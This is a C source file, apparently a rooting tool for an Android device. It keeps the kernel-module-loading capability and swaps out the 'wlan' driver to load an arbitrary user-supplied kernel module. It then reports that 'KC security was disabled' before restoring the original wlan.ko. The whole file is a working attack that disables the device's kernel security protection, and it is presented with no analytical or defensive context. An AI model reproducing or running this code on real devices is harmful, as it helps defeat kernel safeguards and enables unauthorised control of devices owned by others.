#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/capability.h>
#include <sys/stat.h>
#include <sys/prctl.h>

extern int init_module(void *, unsigned long, const char *);
extern int delete_module(const char *, unsigned int);

void *read_file(const char *fn, unsigned *_sz)
{
    char *data;
    int sz;
    int fd;
    struct stat sb;

    data = 0;
    fd = open(fn, O_RDONLY);
    if(fd < 0) return 0;

    if (fstat(fd, &sb) < 0) {
        fprintf(stderr, "fstat failed for '%s'\n", fn);
        goto oops;
    }

    sz = lseek(fd, 0, SEEK_END);
    if(sz < 0) goto oops;

    if(lseek(fd, 0, SEEK_SET) != 0) goto oops;

    data = (char*) malloc(sz + 2);
    if(data == 0) goto oops;

    if(read(fd, data, sz) != sz) goto oops;
    close(fd);
    data[sz] = '\n';
    data[sz+1] = 0;
    if(_sz) *_sz = sz;
    return data;

oops:
    close(fd);
    if(data != 0) free(data);
    return 0;
}

static int set_cap() {
  struct __user_cap_header_struct capheader;
  struct __user_cap_data_struct capdata;
  int id=1000;

  memset(&capheader, 0, sizeof(capheader));
  memset(&capdata, 0, sizeof(capdata));
  capheader.version = _LINUX_CAPABILITY_VERSION;

  prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);

  if (setresgid(id, id, id) || setresuid(id, id, id)) {
    printf("setresgid(%d)/setresuid(%d) failed\n", id, id);
    return -1;
  }

  capdata.effective = capdata.permitted = (1 << CAP_SYS_MODULE);

  if (capset(&capheader, &capdata) < 0) {
    printf("Could not set capabilities: %s\n", strerror(errno));
    return -1;
  }

  return 0;
}

static int insmod_fake(void *module, const unsigned size)
{
    int ret;

    ret = init_module(module, size, "");

    free(module);

    return ret;
}

static int insmod_orig(const char *filename, char *options)
{   
    void *module;
    unsigned size;
    int ret;
    
    module = read_file(filename, &size);
    if (!module)
        return -1;
    
    ret = init_module(module, size, options);
    
    free(module);
    
    return ret;
}


static int rmmod(const char *modname) {
  int ret;
  ret = delete_module(modname, O_NONBLOCK | O_EXCL);
  if (ret != 0) {
    fprintf(stderr, "rmmod: delete_module '%s' failed (%s)\n",
            modname, strerror(errno));
    return -1;
  }
  return 0;
}

int main(int argc, char **argv)
{
  int ret;
  int reload_orig = 0;
  void *module;
  unsigned size;

  if (argc < 2) {
    fprintf(stderr, "usage: %s <module.ko>\n", argv[0]);
    return -1;
  }

  module = read_file(argv[1], &size);
  if (!module) {
      fprintf(stderr, "failed to read %s\n", argv[1]);
      return -1;
  }

  if (set_cap() != 0) {
    free(module);
    return -1;
  }

  ret = rmmod("wlan");
  if (ret == 0) {
    reload_orig = 1;
  }

  ret = insmod_fake(module, size);
  if (ret != 0) {
    fprintf(stderr, "insmod failed (%s)\n", strerror(errno));
    return -1;
  }

  ret = rmmod("wlan");
  if (ret != 0) {
    fprintf(stderr, "rmmod failed (%s)\n", strerror(errno));
    return -1;
  }

  fprintf(stderr, "KC security was disabled\n");

  if (reload_orig) {
    ret = insmod_orig("/system/lib/modules/wlan.ko","con_mode=0 fwpath=sta ioctl_debug=0");
    if (ret != 0) {
      fprintf(stderr, "insmod orig wlan failed (%s)\n", strerror(errno));
      return -1;
    }
  }

  return 0;
}
